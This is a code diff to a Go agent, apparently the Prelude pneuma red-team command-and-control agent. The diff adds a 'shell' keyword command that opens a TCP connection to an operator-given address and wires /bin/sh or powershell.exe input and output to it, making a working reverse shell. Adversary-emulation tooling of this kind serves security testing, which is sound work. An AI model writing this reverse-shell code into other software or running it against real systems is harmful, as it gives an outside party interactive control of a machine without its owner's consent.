@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/preludeorg/pneuma/util"
+	"net"
 	"os"
 	"os/exec"
 	"runtime"
@@ -20,12 +21,16 @@ func RunCommand(message string, executor string, payloadPath string, agent *util
 		return string(bites), 0, 0
 	} else if executor == "keyword" {
 		task := splitMessage(message, '.')
-		if task[0] == "config" {
+		switch task[0] {
+		case "config":
 			return updateConfiguration(task[1], agent)
-		} else if task[0] == "exit" {
+		case "shell":
+			return spawnShell(task[1], agent)
+		case "exit":
 			return shutdown(agent)
+		default:
+			return "Keyword selected not available for agent", 0, 0
 		}
-		return "Keyword selected not available for agent", 0, 0
 	} else {
 		util.DebugLogf("Running instruction")
 		bites, status, pid := execute(message, executor, agent)
@@ -86,6 +91,26 @@ func execution(command *exec.Cmd) ([]byte, int, int){
 		status = command.ProcessState.ExitCode()
 	}
 	return bites, pid, status
+}
+
+func spawnShell(target string, agent *util.AgentConfig) (string, int, int) {
+	var executor string
+	switch runtime.GOOS {
+	case "windows":
+		executor = "powershell.exe"
+	default:
+		executor = "/bin/sh"
+	}
+	shell := exec.Command(executor)
+	conn, _ := net.Dial("tcp", target)
+	shell.Stdout = conn
+	shell.Stdin = conn
+	shell.Stderr = conn
+	err := shell.Start()
+	if err != nil {
+		return "Error spawning shell", agent.Pid, -1
+	}
+	return "Shell spawned successfully", shell.Process.Pid, 0
 }
 
 func updateConfiguration(config string, agent *util.AgentConfig) (string, int, int) {
